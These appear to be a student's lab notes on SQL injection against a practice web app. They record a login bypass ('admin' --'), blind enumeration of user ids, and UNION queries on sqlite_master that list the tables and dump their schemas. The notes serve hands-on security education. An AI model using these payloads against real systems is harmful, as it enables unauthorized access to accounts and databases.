> [!NOTE]
> already known that **admin** is an existing user (via slides)
# login as admin

user: admin' --
pass: <anything>


# find all users
(blind)
```sql
select * from users
where user='user' and pass='pass'
```
user: ' or id = '<val>' --
pass: any

id 1 -> admin
id 2 -> user (alice) -> name column exists
id 3 -> user (bob)
id 4 -> user (charlie)
id 5 -> user (david)
id 6 -> user (emma)
id 7 -> user (frank)
id 8 -> user (grace)
id 9 -> user (henry)
id 10 -> user (isabella)
id 11 -> user (jack)
id 12 -> invalid credentials -> only 12 users

seperate msgs for admin vs nonadmin -> role col exists

# find columns in user table
(blind)
user: ' or <col> = '' --
pass: any

no error -> col exists
## cols

existing cols (user)
- username
- password
- role


# find table
user: 
```
' or id = 2 UNION select * from <table> --
```
```
' or id = 2 UNION select * from message --
```
' or id = 2 UNION select table_name from information_schema.tables  --


sqlite uses sqlite_master for sys table

' or id = 1 UNION select name from sqlite_master  --

```
' UNION select name, null, null, null, null from sqlite_master where type='table' --
' UNION select tbl_name, null, null, null, null from sqlite_master  --
```
-> 5 cols in user

rotate name until displayed user name is table name
-> empty display name, only name at first col works (-> query is `select username, ... from users where ...`)
(sike)

```
' UNION select '1', '2', '3', '4', '5' from sqlite_master where type='table' --
```
(find what maps to what)
    2 -> name
    4 -> role

```
' UNION select name, name, null, null, null from sqlite_master where type='table' --
' UNION select name, tbl_name, null, null, null from sqlite_master where type='table' --
```
-> display name as name, tbl_name

```
' UNION select name, name, null, tbl_name, null from sqlite_master where type='table' limit 1 offset 0 --

```
username -> name
role -> tbl_name
offset to cycle through


## existing tables
| offset | table name |
| -------------- | --------------- |
| 0 | notes |
| 1 | profiles |
| 2 | sqlite_sequence |
| 3 | users |

(4 -> invalid credentials -> dne; only 4 tables)


# extracting cols
```
SELECT sql
FROM sqlite_master 
WHERE name='table name'
```
grabs sql create table statement for table

```
' UNION select sql, null, null, sql, null from sqlite_master where name='tablename' --
```
sql inject to put create table statement in role section


## results
### notes
```
CREATE TABLE notes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    title TEXT,
    content TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    is_public INTEGER DEFAULT 0,
    FOREIGN KEY(user_id) REFERENCES users(id)
)
```

### profiles
```
CREATE TABLE profiles (
    user_id INTEGER PRIMARY KEY,
    full_name TEXT,
    email TEXT,
    bio TEXT,
    avatar_url TEXT,
    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE
)
```

### sqlite_sequence
```
CREATE TABLE sqlite_sequence(name,seq)

```

### users
```sql
TABLE users ( 
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    -- in reality these should be hashed, but kept plain for lab 
    role TEXT DEFAULT 'user',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)
```

